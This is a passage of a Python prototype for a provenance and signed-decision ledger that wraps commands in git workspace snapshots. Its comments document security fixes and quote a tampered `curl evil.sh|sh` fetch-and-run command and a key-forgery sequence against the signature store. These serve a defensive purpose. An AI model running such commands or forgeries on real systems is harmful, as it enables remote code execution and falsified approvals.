#!/usr/bin/env python3
"""OAIP prototype — Observed Action & Intent Protocol.

A minimal, RUNNABLE slice of the provenance stack we sketched:

  Observer  → capture a WORKSPACE SNAPSHOT (not HEAD) before/after an action
              via git plumbing, so history isn't polluted; compute per-file
              EFFECTS (before/after content hashes) from the two snapshots.
  Ledger    → a SQLite PROJECTION over content-addressed truth. Deletable and
              rebuildable; it stores hashes + typed relations, not canon.
  Bridge    → an accepted CLAIM becomes a real, signed Warrant record — the
              decision layer, with the provenance cited as evidence and a
              validation command as a cmd@v1 check. Warrant is a normative
              dependency, not reimplemented here.

Deliberately NOT decided here (later layers): whether the action was correct,
whether the intent was met, which policy has authority, what reaction to run.

Principles it already honors:
  * before_state is a workspace snapshot (index+worktree+untracked+env/toolchain
    fingerprint), because `before_state = HEAD` lies.
  * execution success ≠ acceptance: a claim runs a SEPARATE validation check,
    and only that gates the warrant.
  * a shell command is one EFFECT/execution kind; the model is an envelope.
  * attribution here is exclusive-window (we wrap the command) → high confidence,
    recorded as parts-per-million integers (no floats).

Usage:
  oaip.py init
  oaip.py do --intent "..." --predicate p --check "<cmd>" --actor me@host -- <command...>
  # or step by step: intent / run / claim / accept
  oaip.py log
  oaip.py verify
  oaip.py conformance [vectors.json]

Stdlib only (+ the Warrant reference CLI for the bridge). Run inside a git repo.
"""
import argparse
import hashlib
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import time
import uuid
from pathlib import Path

OAIP = Path(".oaip")
DB = OAIP / "ledger.db"
ART = OAIP / "artifacts"        # content-addressed artifact blobs
WSTORE = OAIP / "warrants"      # the Warrant store (canonical decision layer)
WKEY = OAIP / "dev.key"
PUBKEY = OAIP / "dev.key.pub"    # the public half, recorded by `init` from keygen
TRUST = OAIP / "trust.json"      # OAIP's keyring, in Warrant's trust-config shape
# Warrant is a normative dependency (the decision layer). Point WARRANT_CLI at
# your `warrant.py` (or an installed `warrant`); defaults to a sibling checkout.
_wcli = os.environ.get("WARRANT_CLI")
if _wcli:
    WARRANT = _wcli.split()
else:
    _cand = Path.home() / "Projects/warrant/impl/warrant.py"
    WARRANT = [sys.executable, str(_cand)]
# A sleeping Warrant CLI hung `rebuild` forever: WARRANT_CLI names an arbitrary
# program, so every call to it is bounded (2026-07-30 review, F11).
WARRANT_TIMEOUT = int(os.environ.get("OAIP_WARRANT_TIMEOUT") or 120)
VERIFY_REPORT = "warrant.verify-report@v0"
# The explicit claim→warrant link, carried in the signed `subject.note`. Matched
# CASE-INSENSITIVELY: `note.startswith("oaip-claim:")` let any writer choose the
# weaker code path by spelling it `OAIP-CLAIM:` (2026-07-30, second review round).
NOTE_PREFIX = "oaip-claim:"
STOREMETA = OAIP / "store.json"     # store-format version, written once by `init`
STORE_FORMAT = "oaip-store@v1"


# ---------- content-addressed helpers ----------
def sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


HEX64 = re.compile(r"^[0-9a-f]{64}$")


def warrant_cli_available() -> bool:
    """True when the WARRANT argv names something that can actually run.
    Mirrors tools/check.py: either the program is on PATH / at its path, and —
    for the `python3 …/warrant.py` form — the script file exists.

    NOT an identity check: `WARRANT_CLI=/usr/bin/true` satisfies this. See
    `store_report`, which is the gate that actually asks *what program is this*."""
    prog = WARRANT[0]
    if not (shutil.which(prog) or Path(prog).exists()):
        return False
    if len(WARRANT) >= 2 and WARRANT[1].endswith(".py"):
        return Path(WARRANT[1]).is_file()
    return True


def wrun(*args):
    """The Warrant CLI, bounded in time.

    Every call is `timeout=`-bounded because WARRANT_CLI names an ARBITRARY
    program: a CLI that sleeps forever hung `oaip rebuild` forever, with no
    output and no way to tell it from slow work (2026-07-30 review, F11). A
    timeout is reported as a distinct, non-zero result — never as success."""
    try:
        return subprocess.run(WARRANT + list(args), capture_output=True,
                              text=True, timeout=WARRANT_TIMEOUT)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(
            WARRANT + list(args), 124, "",
            f"the Warrant CLI did not exit within {WARRANT_TIMEOUT}s "
            "(OAIP_WARRANT_TIMEOUT)")
    except OSError as e:
        return subprocess.CompletedProcess(WARRANT + list(args), 127, "",
                                           f"cannot run the Warrant CLI: {e}")


# ---------- OAIP's keyring (key↔actor binding) ----------
# WHY OAIP OWNS THIS, AND WHY IT IS NOT WARRANT'S JOB
# --------------------------------------------------
# Warrant SPEC §5: "Key↔actor binding is out of scope for v0.1 (use your existing
# PKI/keyring); implementations MUST verify signatures against the stated key and
# report the binding as unverified if no keyring is configured." §5.1 adds:
# "Bound/unbound is a report unless a v0.3 policy explicitly makes bound
# signatures required", and "No interchangeable keyring file format is mandated."
#
# So `warrant verify` CANNOT be configured to fail on an unbound signature, and
# it exits 0 for a store whose only record is signed by a freshly generated key
# claiming any actor id it likes. Measured on this branch before this change:
#   warrant keygen --out attacker.key
#   warrant --store .oaip/warrants accept … --note oaip-claim:<cid> \
#           --actor tester@local --key attacker.key
#   -> warrant verify: 0 errors, 1 warning ("binding unverified (no keyring)")
#   -> oaip rebuild:  warrant=1
#   -> oaip log:      WARRANT 41d32da62a81…  (signed decision)
# for a claim NOBODY accepted. The protocol's central fact, forged for free.
#
# Warrant's own settlement grade (`verify --settlement --trust-config`) DOES
# compute bound/unbound against a pinned keyring, and OAIP corroborates with it
# (see `unbound_by_warrant`) — but two properties make it insufficient alone:
# it is a WARN by specification, and its machine-readable
# `warrant.verify-report@v0` omits the finding entirely in quiet mode (the
# emitting branch is `if quiet: pass`), so the JSON an integrator is told to
# consume reports 0 errors and no binding finding for an unbound signer.
# Therefore the ENFORCED rule is OAIP's own, over OAIP's own keyring.
def note_convention_since():
    """The ts from which a missing `oaip-claim:` note is a DEFECT, not history.

    Returns an int, or None when this store predates the store-format marker
    entirely (in which case any of its records may genuinely be legacy).

    WHY A STORE-FORMAT VERSION AND NOT A PROPERTY OF THE RECORD (F8, 2026-07-30,
    second review round). Rebuild routed accepts without the note to a
    subject-hash fallback and called those records "legacy" — but "has no note"
    is a property the WRITER chooses. Omitting the note (or spelling the prefix
    `OAIP-CLAIM:`) selected the weaker path on demand, in a brand-new store,
    fanning one warrant onto every claim with a colliding subject. Reproduced
    here: two direct filings, one with no note and one with a case-variant
    prefix, both took the fallback and both produced an edge, `oaip verify`
    reporting 0 errors.

    So the criterion is one the writer cannot choose: `init` stamps
    `.oaip/store.json` with the moment this store began requiring the note. A
    record filed after that had every opportunity to carry the link, so a missing
    link is a defect in the filer, and no edge is derived — not even with
    --allow-legacy-links. Only a store with NO marker (created before OAIP
    stamped one) can contain genuinely legacy records, and even there the
    fallback stays off until the operator asks for it in as many words."""
    if not STOREMETA.is_file():
        return None
    try:
        meta = loads_ijson(STOREMETA.read_bytes())
        ts = meta.get("note_convention_since")
        return ts if isinstance(ts, int) and not isinstance(ts, bool) else None
    except (ValueError, OSError):
        return None


def ensure_trust():
    """OAIP's keyring must exist before anything verifies: a missing trust config
    makes Warrant's settlement preflight fail closed, and an empty one is the
    honest starting point (no actor is bound until OAIP binds it)."""
    OAIP.mkdir(exist_ok=True)
    if not TRUST.is_file():
        TRUST.write_text(json.dumps({"actors": {}}, sort_keys=True) + "\n")


def read_trust():
    """(actors, error). `actors` maps actor id → list of hex64 public keys.

    Deliberately in Warrant's trust-config shape (`{"actors": {...}}`, the closed
    schema its `--trust-config` validates) so the SAME file can be handed to
    Warrant's settlement grade; OAIP does not invent a second format."""
    if not TRUST.is_file():
        return {}, None
    try:
        doc = loads_ijson(TRUST.read_bytes())
    except (ValueError, OSError) as e:
        return None, f"{TRUST}: unreadable keyring: {e}"
    if not isinstance(doc, dict) or not isinstance(doc.get("actors", {}), dict):
        return None, f"{TRUST}: not a keyring ({{\"actors\": {{...}}}} expected)"
    actors = {}
    for a, keys in doc["actors"].items() if doc.get("actors") else []:
        if not (isinstance(keys, list) and all(isinstance(k, str) and HEX64.match(k)
                                               for k in keys)):
            return None, f"{TRUST}: actor {a!r} has a malformed key list"
        actors[a] = list(keys)
    return actors, None


def bind_actor(actor: str, key: str):
    """Record that `key` may sign as `actor`. Called only by `cmd_accept`, only
    for the key `.oaip/dev.key` — the key THIS ledger generated and custodies —
    so an attacker's key is never written here by any OAIP code path."""
    ensure_trust()
    actors, err = read_trust()
    if err:
        sys.exit(f"refusing to file an acceptance: {err}")
    if key in actors.get(actor, []):
        return
    actors.setdefault(actor, []).append(key)
    TRUST.write_text(json.dumps({"actors": actors}, sort_keys=True) + "\n")


def unbound_signers(env, actors):
    """Which of this record's signatures fail to establish who signed it.

    Returns a list of human-readable reasons; empty means EVERY signature entry
    names a key this keyring binds to the actor that entry claims. "Every", not
    "some", on purpose: Warrant's §5 lets anyone with store write access append
    co-signatures, and a record could carry a bound-but-invalid signature next to
    an unbound-but-valid one. Requiring all of them, together with a Warrant
    verification that reported no excluded signature and no error, leaves no
    signature on the record that OAIP has not accounted for."""
    reasons = []
    sigs = env.get("sigs")
    if not isinstance(sigs, list) or not sigs:
        return ["the record carries no signatures"]
    for s in sigs:
        if not isinstance(s, dict):
            reasons.append("a signature entry is not an object")
            continue
        a, k = s.get("actor"), s.get("key")
        if not (isinstance(a, str) and isinstance(k, str)):
            reasons.append("a signature entry has no actor/key strings")
        elif k not in actors.get(a, []):
            reasons.append(f"key {k[:12]} is not bound to actor {a!r} in {TRUST}")
    return reasons


def store_report(settlement=True):
    """(report, error) — the Warrant CLI's `warrant.verify-report@v0` object.

    THIS IS ALSO THE CLI IDENTITY PROBE (2026-07-30 review, F9). The previous
    gate was "some program exited 0", so `WARRANT_CLI=/usr/bin/true` re-opened
    the original forgery in full: rebuild derived every acceptance edge from a
    store nothing had verified, and printed "(signed decision)". Exiting 0 is not
    evidence of having verified anything. A program that cannot produce a
    parseable report NAMING ITSELF (`"report": "warrant.verify-report@v0"`, with
    integer counts and a findings list) is not a Warrant verifier as far as OAIP
    is concerned, and OAIP refuses rather than trusting the exit code."""
    if not warrant_cli_available():
        return None, ("no runnable Warrant CLI is configured (set WARRANT_CLI) "
                      "— refusing to reason about signatures nothing verified")
    ensure_trust()
    argv = ["--store", str(WSTORE), "verify", "--store-mode", "--json"]
    if settlement:
        argv += ["--settlement", "--trust-config", str(TRUST)]
    r = wrun(*argv)
    try:
        doc = json.loads(r.stdout)
    except ValueError:
        tail = (r.stdout + r.stderr).strip().splitlines()
        return None, (f"the configured Warrant CLI ({' '.join(WARRANT)}) did not "
                      f"emit a {VERIFY_REPORT} object (exit {r.returncode}) — an "
                      "exit status is not a verification"
                      + (f": {tail[-1][:120]}" if tail else ""))
    if not (isinstance(doc, dict) and doc.get("report") == VERIFY_REPORT
            and isinstance(doc.get("errors"), int)
            and isinstance(doc.get("warnings"), int)
            and isinstance(doc.get("findings"), list)):
        return None, (f"the configured Warrant CLI ({' '.join(WARRANT)}) emitted "
                      f"JSON that is not a {VERIFY_REPORT}")
    return doc, None


def findings_by_record(report):
    """subject → [messages], for the per-record half of a verify report."""
    out = {}
    for f in report.get("findings", []):
        if isinstance(f, dict) and isinstance(f.get("subject"), str):
            out.setdefault(f["subject"], []).append(str(f.get("message", "")))
    return out


# Findings that mean "OAIP cannot tell which signature on this record is the
# valid one" — an excluded (non-verifying) entry, or a malformed entry. Warrant
# reports these but does not treat them as fatal, correctly: they are only fatal
# for the narrower question OAIP asks, which is whether a specific actor accepted.
_AMBIGUOUS_SIG = ("does not verify", "is not an object", "no signatures",
                  "sigs must be a list")


def unbound_by_warrant():
    """Warrant's OWN bound/unbound determination, as corroboration.

    `verify --settlement --trust-config` reports `signature unbound` / `binding
    unverified` in its human report against the same keyring file OAIP writes.
    It is read from the TEXT output because the machine-readable report drops the
    finding in quiet mode (`if quiet: pass` in warrant.py's emitting branch), so
    the JSON cannot carry it. Returns a set of 12-char WarrantID prefixes; an
    unreadable run returns None, which callers must treat as "no corroboration",
    never as "clean" — the enforced check is `unbound_signers`."""
    ensure_trust()
    r = wrun("--store", str(WSTORE), "verify", "--settlement",
             "--trust-config", str(TRUST))
    if r.returncode not in (0, 1):
        return None
    flagged = set()
    for line in (r.stdout + r.stderr).splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[0] == "WARN" and (
                "signature unbound" in line or "binding unverified" in line):
            flagged.add(parts[1])
    return flagged


# ---------- strict I-JSON ingestion (SPEC §1) ----------
# §1 says every OAIP record is canonical I-JSON "exactly per Warrant SPEC §4".
# Serialising canonically is only half of that: the other half is REFUSING input
# outside the domain, and until 2026-07-30 nothing here refused anything —
# `json.loads` was called bare on every artifact read. Stock Python accepts
# duplicate member names (last-wins), NaN/Infinity, and lone surrogates; Warrant
# rejects all three, and Go's decoder disagrees with Python on the last two. So
# the same bytes would parse to different records in different implementations
# while the SPEC claimed one domain. These are reimplemented rather than imported
# from Warrant so OAIP stands alone as an implementation — and
# `tests/ijson_parity.py` pins them against Warrant's so the copy cannot drift.
def _reject_dup_keys(pairs):
    d = {}
    for k, v in pairs:
        if k in d:
            raise ValueError(f"duplicate member name: {k}")
        d[k] = v
    return d


def _reject_constant(sym):
    raise ValueError(f"invalid I-JSON constant: {sym}")


def _reject_lone_surrogates(obj):
    """RFC 7493: every string is valid Unicode. Python keeps a `\\ud800` escape as
    a surrogate code point; Go substitutes U+FFFD — the same bytes, two different
    strings, two different hashes."""
    if isinstance(obj, str):
        for ch in obj:
            if 0xD800 <= ord(ch) <= 0xDFFF:
                raise ValueError("lone surrogate in string (invalid I-JSON)")
    elif isinstance(obj, dict):
        for k, v in obj.items():
            _reject_lone_surrogates(k)
            _reject_lone_surrogates(v)
    elif isinstance(obj, list):
        for v in obj:
            _reject_lone_surrogates(v)
    return obj


def _reject_floats(obj, path="$"):
    """§1: "integers only (no floats anywhere)". Warrant enforces this per typed
    field in `validate_body`; OAIP had no schema layer at all, so it is enforced
    here at the domain boundary — a float `ts` or a fractional `confidence_ppm`
    is outside the format, not a value to round."""
    if isinstance(obj, float):
        raise ValueError(f"float at {path}: SPEC §1 permits integers only")
    if isinstance(obj, dict):
        for k, v in obj.items():
            _reject_floats(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _reject_floats(v, f"{path}[{i}]")
    return obj


def loads_ijson(raw):
    """`json.loads` restricted to the domain SPEC §1 actually declares.

    The BOM case is a deliberate narrowing, not a grammar violation: RFC 8259 §8.1
    lets a receiver ignore a leading byte order mark, and "MAY" is unaffordable in
    a content-addressed format — the same record would arrive as two byte strings
    with two different addresses. Measured: Python's `json.loads` strips a BOM from
    BYTES and returns the record, Go's `encoding/json` rejects it. This mattered
    here and not in Warrant: `read_artifact` passes raw bytes, so the BOM was
    genuinely accepted, whereas every Warrant call site passes a `str`, where
    `json.loads` already fails. The reject vector recorded it as
    "ACCEPTED — must be refused" before this line existed."""
    bom = b"\xef\xbb\xbf" if isinstance(raw, (bytes, bytearray)) else "﻿"
    if raw[:len(bom)] == bom:
        raise ValueError("leading byte order mark (not canonical I-JSON)")
    return _reject_floats(_reject_lone_surrogates(
        json.loads(raw, object_pairs_hook=_reject_dup_keys,
                   parse_constant=_reject_constant)))


def read_artifact(path: Path):
    """Load an artifact, refusing bytes that do not hash to their own address.

    THE DEFECT THIS CLOSES (found 2026-07-30)
    -----------------------------------------
    `.oaip/artifacts` IS the canonical layer: SPEC §5 ends "the projection is
    disposable; the content-addressed causal graph is the truth." Every reader
    used bare `json.loads(path.read_bytes())` and never recomputed the address,
    so editing a file in place silently rewrote the truth. Demonstrated: an
    execution record's `command` was changed to `sh -c curl evil.sh|sh`,
    `rebuild` reported success, and the projection asserted the forged command
    while the file still sat under its original name. Content-addressed storage
    whose reader never checks the address is not content-addressed; it is a
    directory of files with long names.

    Returns (doc, error). `doc` is None when the artifact must not be used.
    """
    raw = path.read_bytes()
    if path.name != sha256(raw):
        return None, (f"{path.name[:12]}: bytes hash to {sha256(raw)[:12]} — "
                      "artifact does not match its own address")
    try:
        doc = loads_ijson(raw)
    except json.JSONDecodeError:
        # A transcript or a plain blob, not a record. Must be caught BEFORE
        # ValueError: JSONDecodeError subclasses it, so the wider clause first
        # would report every non-JSON artifact as a canonicalization failure.
        return None, None
    except ValueError as e:
        return None, f"{path.name[:12]}: not canonical I-JSON: {e}"
    return doc, None


def canon(obj) -> bytes:
    """RFC 8785 (JCS) I-JSON, EXACTLY per Warrant SPEC §4 (SPEC §1): sorted keys,
    compact separators, UTF-8, integers only, raw non-ASCII (ensure_ascii=False).
    A record's identity is SHA-256 of these bytes; every OAIP implementation MUST
    agree on them, so this must match Warrant's canonicalization byte-for-byte."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=False).encode("utf-8")


def put_artifact(data: bytes, kind: str) -> str:
    ART.mkdir(parents=True, exist_ok=True)
    h = sha256(data)
    p = ART / h
    if not p.exists():
        p.write_bytes(data)
    con = db()
    con.execute("INSERT OR IGNORE INTO artifacts(hash, kind, size) VALUES (?,?,?)",
                (h, kind, len(data)))
    con.commit()
    return h


def kid() -> str:
    # time-sortable-ish id (uuid7 not in stdlib; use ts + short uuid)
    return f"{int(time.time()*1000):013d}-{uuid.uuid4().hex[:8]}"


# ---------- git plumbing: the workspace snapshot ----------
def git(*args, **kw) -> str:
    r = subprocess.run(["git", *args], capture_output=True, text=True, **kw)
    if r.returncode != 0:
        raise RuntimeError(f"git {' '.join(args)}: {r.stderr.strip()}")
    return r.stdout.strip()


def workspace_snapshot() -> str:
    """Content-addressed tree of the FULL worktree (tracked + staged + untracked),
    built in a throwaway index so `git log` is never touched. This is the honest
    `before_state`/`after_state`, unlike HEAD.

    `.oaip/` is NEVER part of the snapshot. Until 2026-07-30 it was: `git add -A`
    into the throwaway index wrote `.oaip/dev.key` — the Ed25519 SIGNING KEY —
    as a loose blob into `.git/objects` of any repo whose .gitignore did not
    already exclude `.oaip/` (a fresh `git init` + `oaip init` was enough).
    A throwaway index does not mean throwaway objects: `git add` writes blobs
    to the object database, where they sit recoverable by hash and travel with
    any clone/push that reaches them. The observer must not exfiltrate its own
    key custody into the thing it observes; nor is the ledger/store part of the
    observed workspace — a snapshot that contains the observation machinery
    changes whenever the machinery does, which is the observer effect, not
    provenance. The exclusion is done here with a pathspec (not .gitignore) so
    it does not depend on user configuration.

    The pathspecs are REPO-ROOTED, DEPTH-AGNOSTIC and CASE-INSENSITIVE, and all
    three properties are load-bearing (2026-07-30 adversarial review, two rounds,
    fresh-context Claude-family reviewer — every hole reproduced):
      * The first fix used `-- . ':(exclude).oaip'`. `:(exclude).oaip` anchors
        at the pathspec root, so a NESTED ledger (`sub/.oaip/dev.key`, from an
        `oaip init` run in a subdirectory) still landed in `.git/objects` —
        the same key leak, one directory down. `:(top,exclude,glob)**/.oaip/**`
        excludes the ledger at ANY depth (a leading `**/` matches zero or more
        components, so the top level is covered too).
      * Both pathspecs were cwd-relative. Run from `sub/`, `-- .` silently
        NARROWED the snapshot from the whole worktree to the cwd subtree (a
        wrapped command mutating anything outside cwd became unobserved), and
        `git rm --cached -- .oaip` referred to `sub/.oaip`, so a HEAD-tracked
        root `.oaip` survived into every tree written here. `:/` (add) and
        `:(top,…)` (both) resolve from the repository root regardless of cwd.
      * `:(top,exclude,glob)` matched CASE-SENSITIVELY, and this repository's own
        development platform (macOS/APFS) is case-INSENSITIVE. `OAIP.mkdir(
        exist_ok=True)` therefore succeeds into a pre-existing `.OAIP`, every
        later `.oaip/...` write lands there, and git reports the REAL on-disk
        name — which `**/.oaip/**` does not match. Measured on macOS before this
        fix: with `.OAIP/dev.key` HEAD-tracked, the snapshot tree listed
        `.OAIP/dev.key` and the key's blob was in `.git/objects`; with an
        untracked `.OAIP` and a DIRECTORY named `.gitignore` (so wall 2 only
        warns), the tree gained `.OAIP/dev.key`, `.OAIP/ledger.db`,
        `.OAIP/tmp.index` and `.OAIP/tmp.index.lock`. `icase` closes it; on a
        case-SENSITIVE filesystem it costs only that a directory deliberately
        named `.OAIP` is also treated as a ledger and left out — the safe
        direction for a signing key.
    Verified against git 2.50: top-level and nested, from root and from a
    subdirectory, with and without a HEAD-tracked `.oaip`, and in both letter
    cases on a case-insensitive filesystem."""
    tmp_index = OAIP / "tmp.index"
    env = dict(os.environ, GIT_INDEX_FILE=str(tmp_index.resolve()))
    # seed the throwaway index from HEAD if it exists, else empty, then add all
    subprocess.run(["git", "read-tree", "HEAD"], env=env, capture_output=True)
    subprocess.run(["git", "add", "-A", "--", ":/",
                    ":(top,exclude,glob,icase)**/.oaip/**",
                    ":(top,exclude,glob,icase)**/.oaip"],
                   env=env, capture_output=True)
    # If HEAD itself tracks .oaip (a user committed it before init learned to
    # gitignore it), read-tree seeded those entries; drop them so no tree this
    # function writes ever contains the key or the store — at any depth, from
    # any cwd.
    subprocess.run(["git", "rm", "-r", "-q", "--cached", "--ignore-unmatch",
                    "--", ":(top,glob,icase)**/.oaip/**",
                    ":(top,glob,icase)**/.oaip"],
                   env=env, capture_output=True)
    tree = subprocess.run(["git", "write-tree"], env=env, capture_output=True, text=True).stdout.strip()
    tmp_index.unlink(missing_ok=True)
    return tree


def env_fingerprint() -> str:
    manifest = {
        "uname": subprocess.run(["uname", "-sm"], capture_output=True, text=True).stdout.strip(),
        "git": git("--version"),
        "python": sys.version.split()[0],
    }
    return sha256(json.dumps(manifest, sort_keys=True).encode())


def effects_between(before_tree: str, after_tree: str):
    """Per-file mutations: (path, status, before_blob, after_blob) via diff-tree."""
    out = git("diff-tree", "-r", "--no-commit-id", before_tree, after_tree)
    for line in out.splitlines():
        if not line:
            continue
        meta, path = line.split("\t", 1)
        _, _, before_blob, after_blob, status = meta.split()[:5]
        zero = "0" * 40
        yield {
            "path": path,
            "status": {"A": "created", "M": "modified", "D": "deleted"}.get(status[0], status),
            "before_blob": None if before_blob == zero else before_blob,
            "after_blob": None if after_blob == zero else after_blob,
        }


# ---------- ledger (SQLite projection) ----------
def db():
    con = sqlite3.connect(DB)
    con.execute("PRAGMA foreign_keys=ON")
    return con


SCHEMA = """
CREATE TABLE IF NOT EXISTS intents(
  id TEXT PRIMARY KEY, description TEXT NOT NULL, parent_id TEXT, created_at INTEGER);
CREATE TABLE IF NOT EXISTS executions(
  id TEXT PRIMARY KEY, intent_id TEXT, command TEXT NOT NULL, exit_code INTEGER,
  before_tree TEXT, after_tree TEXT, env_fp TEXT, stdout_hash TEXT, created_at INTEGER);
CREATE TABLE IF NOT EXISTS effects(
  id INTEGER PRIMARY KEY AUTOINCREMENT, execution_id TEXT, path TEXT, status TEXT,
  before_blob TEXT, after_blob TEXT);
CREATE TABLE IF NOT EXISTS artifacts(
  hash TEXT PRIMARY KEY, kind TEXT, size INTEGER);
CREATE TABLE IF NOT EXISTS attributions(
  effect_id INTEGER, cause TEXT, method TEXT, confidence_ppm INTEGER);
CREATE TABLE IF NOT EXISTS claims(
  id TEXT PRIMARY KEY, execution_id TEXT, predicate TEXT, check_cmd TEXT,
  check_exit INTEGER, transcript_hash TEXT, subject_hash TEXT, supported INTEGER, created_at INTEGER);
CREATE TABLE IF NOT EXISTS warrants(
  claim_id TEXT, warrant_id TEXT, created_at INTEGER);
"""


# ---------- commands ----------
def cmd_init(_):
    OAIP.mkdir(exist_ok=True)
    db().executescript(SCHEMA)
    wrun("--store", str(WSTORE), "init")
    if not WKEY.exists():
        r = wrun("keygen", "--out", str(WKEY))
        # Record the PUBLIC half. OAIP is stdlib-only and cannot derive an Ed25519
        # public key from a seed, so the one moment the pubkey is knowable is the
        # line `warrant keygen` prints. Without it OAIP could not say which key it
        # custodies, and a keyring that cannot name its own key is not a keyring.
        m = re.search(r"\bpubkey\s+([0-9a-f]{64})\b", r.stdout or "")
        if m:
            PUBKEY.write_text(m.group(1) + "\n")
    ensure_trust()
    # Stamp the store format ONCE, and never restamp: this marker is what tells
    # `rebuild` that every accept in this store had the chance to carry an
    # explicit claim link, so a missing one is a defect and not history (F8).
    if not STOREMETA.is_file():
        STOREMETA.write_text(json.dumps(
            {"oaip_store": STORE_FORMAT, "note_convention_since": int(time.time())},
            sort_keys=True) + "\n")
    # Keep the signing key and the store out of the USER's own commits too.
    # workspace_snapshot() excludes .oaip by pathspec, but a plain `git add -A`
    # by the user would still commit dev.key; init owns the directory, so init
    # owns keeping it ignored. Idempotent: never duplicates the line, and a
    # bare `.oaip` already present is already an exclusion — appending `.oaip/`
    # next to it would be noise. A DIRECTORY named .gitignore is not writable
    # config: warn and move on rather than crash (IsADirectoryError, found in
    # the 2026-07-30 adversarial review).
    gitignore = Path(".gitignore")
    if gitignore.exists() and not gitignore.is_file():
        print(f"warning: {gitignore} is not a regular file; add '.oaip/' to "
              "your git excludes yourself", file=sys.stderr)
    else:
        lines = gitignore.read_text().splitlines() if gitignore.is_file() else []
        already = {".oaip", ".oaip/", "/.oaip", "/.oaip/"}
        if not any(l.strip() in already for l in lines):
            with gitignore.open("a") as f:
                if lines and not gitignore.read_text().endswith("\n"):
                    f.write("\n")
                f.write(".oaip/\n")
    print(f"initialized .oaip (ledger + warrant store + dev key)")


def cmd_intent(a):
    i = kid()
    con = db()
    ts = int(time.time())
    # SPEC §5 is a MUST: the canonical layer is content-addressed artifacts plus the
    # Warrant store, and the SQLite index is a PROJECTION that must be rebuildable
    # from it. Records used to exist only as rows -- so deleting the projection
    # destroyed the invocation, the exit code, the state snapshots, the environment
    # fingerprint and the intent link, none of which appeared anywhere
    # content-addressed. Demonstrated 2026-07-30 by deleting ledger.db. The
    # projection was the source of truth, which is the one thing §5 forbids, and
    # the opposite of the SPEC's own closing line.
    put_artifact(canon({"oaip_record": "intent@v1", "id": i,
                        "description": a.description, "parent": a.parent,
                        "ts": ts}), "record:intent")
    con.execute("INSERT INTO intents(id, description, parent_id, created_at) VALUES (?,?,?,?)",
                (i, a.description, a.parent, ts))
    con.commit()
    print(i)
    return i


def cmd_run(a):
    before = workspace_snapshot()
    env_fp = env_fingerprint()
    proc = subprocess.run(a.command, capture_output=True, text=True)
    after = workspace_snapshot()
    stdout_hash = put_artifact((proc.stdout + proc.stderr).encode(), "stdout")
    eid = kid()
    con = db()
    ts = int(time.time())
    effects = list(effects_between(before, after))
    # One canonical artifact carrying the execution AND its effects and
    # attributions, so the whole causal step survives the projection (§5).
    put_artifact(canon({
        "oaip_record": "execution@v1", "id": eid, "intent": a.intent,
        "command": " ".join(a.command), "exit_code": proc.returncode,
        "before_tree": before, "after_tree": after, "env_fp": env_fp,
        "stdout": stdout_hash, "ts": ts,
        "effects": [{"path": e["path"], "status": e["status"],
                     "before": e["before_blob"], "after": e["after_blob"],
                     # Attribution travels with the effect it explains: a causal
                     # claim separated from what it explains is not recoverable.
                     "attribution": {"cause": eid,
                                     "method": "exclusive-command-window",
                                     "confidence_ppm": 999000}}
                    for e in effects],
    }), "record:execution")
    con.execute("""INSERT INTO executions(id,intent_id,command,exit_code,before_tree,after_tree,
                   env_fp,stdout_hash,created_at) VALUES (?,?,?,?,?,?,?,?,?)""",
                (eid, a.intent, " ".join(a.command), proc.returncode, before, after,
                 env_fp, stdout_hash, ts))
    n = 0
    for e in effects:
        cur = con.execute("""INSERT INTO effects(execution_id,path,status,before_blob,after_blob)
                             VALUES (?,?,?,?,?)""",
                          (eid, e["path"], e["status"], e["before_blob"], e["after_blob"]))
        # exclusive-window attribution: we wrapped the command -> high confidence
        con.execute("INSERT INTO attributions(effect_id,cause,method,confidence_ppm) VALUES (?,?,?,?)",
                    (cur.lastrowid, eid, "exclusive-command-window", 999000))
        n += 1
    con.commit()
    print(f"execution {eid}  exit={proc.returncode}  effects={n}  before={before[:10]} after={after[:10]}")
    return eid


def cmd_claim(a):
    con = db()
    ex = con.execute("SELECT id FROM executions WHERE id=?", (a.execution,)).fetchone()
    if not ex:
        sys.exit(f"no execution {a.execution}")
    # validation check — SEPARATE from execution success (exit_code=0 earns nothing)
    chk = subprocess.run(a.check, shell=True, capture_output=True, text=True)
    transcript_hash = put_artifact((chk.stdout + chk.stderr).encode(), "check-transcript")
    supported = 1 if chk.returncode == 0 else 0
    # content-addressed claim subject (what the decision is ABOUT)
    subject = {
        "oaip_subject": "claim@v1",
        "predicate": a.predicate,
        "execution": a.execution,
        "effects": [dict(path=r[0], status=r[1], after=r[2]) for r in
                    con.execute("SELECT path,status,after_blob FROM effects WHERE execution_id=?",
                                (a.execution,)).fetchall()],
    }
    subject_hash = put_artifact(canon(subject), "claim-subject")   # JCS, SPEC §1
    cid = kid()
    # The claim record itself, not only its subject: check command, exit code,
    # verdict and transcript are the §4 evidence that execution success is not
    # acceptance, and they were projection-only until now.
    put_artifact(canon({"oaip_record": "claim@v1", "id": cid,
                        "execution": a.execution, "predicate": a.predicate,
                        "check": a.check, "check_exit": chk.returncode,
                        "supported": bool(supported), "transcript": transcript_hash,
                        "subject": subject_hash, "ts": int(time.time())}),
                 "record:claim")
    con.execute("""INSERT INTO claims(id,execution_id,predicate,check_cmd,check_exit,
                   transcript_hash,subject_hash,supported,created_at) VALUES (?,?,?,?,?,?,?,?,?)""",
                (cid, a.execution, a.predicate, a.check, chk.returncode,
                 transcript_hash, subject_hash, supported, int(time.time())))
    con.commit()
    print(f"claim {cid}  predicate={a.predicate}  check_exit={chk.returncode}  "
          f"{'SUPPORTED' if supported else 'UNSUPPORTED (check failed)'}")
    return cid, bool(supported)


def cmd_accept(a):
    """THE BRIDGE: an accepted claim becomes a signed Warrant record."""
    con = db()
    c = con.execute("""SELECT predicate,check_cmd,check_exit,transcript_hash,subject_hash,supported
                       FROM claims WHERE id=?""", (a.claim,)).fetchone()
    if not c:
        sys.exit(f"no claim {a.claim}")
    predicate, check_cmd, check_exit, transcript_hash, subject_hash, supported = c
    if not supported:
        sys.exit("refusing to accept: the claim's validation check did NOT pass "
                 "(execution success is not acceptance)")
    # materialize the subject + policy + check blob + transcript as warrant blobs
